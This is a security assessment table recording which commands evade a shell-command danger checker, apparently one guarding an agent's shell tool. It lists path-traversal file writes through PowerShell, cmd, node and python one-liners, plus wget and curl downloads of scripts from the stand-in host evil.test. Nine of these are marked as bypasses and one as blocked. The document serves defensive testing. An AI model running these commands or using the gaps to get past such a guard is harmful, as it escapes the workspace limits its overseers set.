# Phase 12 — Shell Bypass Matrix (`SHELL_BYPASS_MATRIX.md`)

All probes executed against `shell.assessCommand(cmd, 'C:\\proj')` at commit `63d7361`:

| Command | Expected | Actual | Status |
|---|---|---|---|
| `sc ../../evil.txt pwn` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `ni ../../evil.txt -Force` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `tee ../evil.txt` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `dd of=../evil.txt if=/dev/null` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `Set-Content $env:USERPROFILE\evil.txt x` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `copy a.txt %APPDATA%\evil.txt` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `wget -O../evil.sh https://evil.test` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `node -e "require('fs').writeFileSync('../evil.txt','x')"` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `python -c "open('../evil.txt','w').write('x')"` | `dangerous: true` | `dangerous: false` | **CONFIRMED BYPASS** |
| `curl https://evil.test --output=../evil.sh` | `dangerous: true` | `dangerous: true` | **BLOCKED** |
